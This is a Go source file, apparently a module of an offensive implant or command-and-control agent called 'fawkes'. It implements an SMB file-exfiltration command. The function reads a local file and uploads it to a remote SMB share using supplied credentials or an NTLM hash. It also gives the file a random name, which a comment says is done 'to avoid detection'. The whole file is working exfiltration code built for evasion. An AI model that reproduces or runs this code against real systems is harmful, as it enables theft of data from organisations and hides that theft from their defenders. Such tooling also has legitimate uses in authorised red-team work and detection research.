package commands

import (
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"

	"fawkes/pkg/structs"
)

// smbExfilResult tracks SMB exfiltration progress.
type smbExfilResult struct {
	Host       string `json:"host"`
	Share      string `json:"share"`
	RemotePath string `json:"remote_path"`
	FileName   string `json:"filename"`
	TotalSize  int    `json:"total_size"`
	Success    bool   `json:"success"`
}

// smbExfilFile reads a local file and writes it to a remote SMB share for exfiltration.
// If no remote path is specified, a random filename is generated to avoid detection.
func smbExfilFile(args smbArgs) structs.CommandResult {
	// Read local file
	data, err := os.ReadFile(args.Source)
	if err != nil {
		return errorf("Error reading source file: %v", err)
	}
	if len(data) == 0 {
		return errorResult("Error: source file is empty")
	}

	// Generate random filename if path not specified
	remotePath := args.Path
	if remotePath == "" {
		randBytes := make([]byte, 8)
		_, _ = rand.Read(randBytes)
		ext := filepath.Ext(args.Source)
		if ext == "" {
			ext = ".tmp"
		}
		remotePath = hex.EncodeToString(randBytes) + ext
	}

	// Connect to SMB
	session, conn, err := smbDialSession(args.Host, args.Port, args.Username, args.Domain, args.Password, args.Hash, smbOperationTimeout)
	if err != nil {
		return errorf("Error connecting to %s: %v", args.Host, err)
	}
	sc := &smbConn{session: session, conn: conn}
	defer sc.close()

	// Mount share
	sc.setDeadline(smbOperationTimeout)
	share, err := sc.session.Mount(fmt.Sprintf(`\\%s\%s`, args.Host, args.Share))
	if err != nil {
		return errorf("Error mounting share %s: %v", args.Share, err)
	}
	defer share.Umount()

	// Write file
	sc.setDeadline(smbOperationTimeout)
	f, err := share.Create(remotePath)
	if err != nil {
		return errorf("Error creating remote file %s: %v", remotePath, err)
	}

	_, err = f.Write(data)
	f.Close()
	if err != nil {
		return errorf("Error writing to remote file: %v", err)
	}

	result := smbExfilResult{
		Host:       args.Host,
		Share:      args.Share,
		RemotePath: remotePath,
		FileName:   filepath.Base(args.Source),
		TotalSize:  len(data),
		Success:    true,
	}

	output, _ := json.Marshal(result)
	return successResult(string(output))
}
